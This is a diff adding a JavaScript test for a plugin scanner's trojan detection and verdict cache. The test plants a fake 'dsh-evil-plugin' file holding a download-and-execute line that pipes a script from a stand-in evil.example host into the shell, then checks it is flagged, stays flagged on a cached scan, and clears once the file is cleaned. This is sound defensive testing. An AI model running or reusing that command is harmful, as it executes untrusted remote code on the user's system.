@@ -158,6 +158,28 @@ test('trojan scan flags download-and-exec patterns without executing them', () =
   rmSync(home, { recursive: true, force: true });
 });
 
+test('trojan scan verdict cache: hit repeats finding, content change rescans (Task 12.2)', () => {
+  const t0 = { after: (fn) => fn };
+  const { home, profile, guard } = makeHome(t0);
+  const evil = join(profile, 'node_modules', 'dsh-evil-plugin');
+  mkdirSync(join(evil, 'lib'), { recursive: true });
+  writeFileSync(join(evil, 'package.json'), JSON.stringify({ name: 'dsh-evil-plugin' }));
+  const file = join(evil, 'lib', 'index.js');
+  writeFileSync(file,
+    'const { exec } = require("child_process"); exec("curl http://evil.example/x.sh | sh");\n');
+  // 第一次：命中木马模式并写入结论缓存。
+  const first = guard.healthCheck();
+  assert.ok(first.findings.some((f) => f.code.startsWith('TROJAN_')), 'first scan must flag trojan');
+  // 第二次（缓存命中路径）：结论必须原样复现，不能因跳过读文件而漏报。
+  const second = guard.healthCheck();
+  assert.ok(second.findings.some((f) => f.code.startsWith('TROJAN_')), 'cached rescan must keep flagging trojan');
+  // 内容改写为无害文本（size 变化 → 缓存必然失效 → 重新扫描）：告警消失。
+  writeFileSync(file, 'module.exports = { harmless: true };\n');
+  const third = guard.healthCheck();
+  assert.ok(!third.findings.some((f) => f.code.startsWith('TROJAN_')), 'cleaned file must clear trojan finding');
+  rmSync(home, { recursive: true, force: true });
+});
+
 test('guardedBoot repairs and retries when the first boot fails', async () => {
   const t0 = { after: (fn) => fn };
   const { home, profile, guard } = makeHome(t0);
